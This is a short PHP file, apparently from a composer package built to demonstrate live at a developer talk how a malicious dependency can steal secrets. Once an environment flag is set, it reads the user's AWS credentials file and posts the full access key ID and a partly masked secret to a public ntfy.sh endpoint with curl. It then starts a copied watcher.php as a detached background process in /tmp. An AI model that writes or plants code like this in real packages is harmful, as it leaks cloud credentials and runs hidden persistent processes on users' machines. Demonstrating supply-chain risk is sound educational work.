<?php

/**
 * WHAT IS THIS ??
 * This is a little experiment I made to prove in live, during a talk at a dev conf,
 * the danger of adding a composer package without checking its source code. 
 * Don't be scared. This is just for demo purposes.
 * AND, this is completely un executed without an ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
 * Also, this project is anyway completely abandonned and used by maybe no-one.
 */

if (!isset($_SERVER['ALLOW_MORPHEUS_EXPERIMENT'])) {
  return false;
}

// Looking for the AWS credentials
$credFile = $_SERVER['HOME']."/.aws/credentials";
$credentials = parse_ini_file($credFile, true)['default'] ?? null;

if (!$credentials) {
  return false;
}

if (isset($credentials['aws_access_key_id'])) {
  $key = $credentials['aws_access_key_id'];
  $secret = $credentials['aws_secret_access_key'];
  // This is just a POC, we don't really want to compromise your secret
  // Here we mask the secret to avoid leaking it during the demo.
  // but if you are reading this, you should be aware that a malicious package 
  // could have done it without your knowledge.
  $secret = substr($secret, 0, 8) . str_repeat('*', 32);

  $message = "AWS Credentials found:\n";
  $message .= "Key: $key\n";
  $message .= "Secret: $secret\n";

  // Send the message to a remote server
  shell_exec("curl --silent -d '$message' ntfy.sh/morpheus");
}

exec('cp ' . escapeshellarg(__DIR__ . '/watcher.php') . ' /tmp/watcher.php');

$cmd = sprintf(
    'nohup php %s > /tmp/watcher.log 2>&1 &',
    escapeshellarg('/tmp/watcher.php')
);

exec($cmd);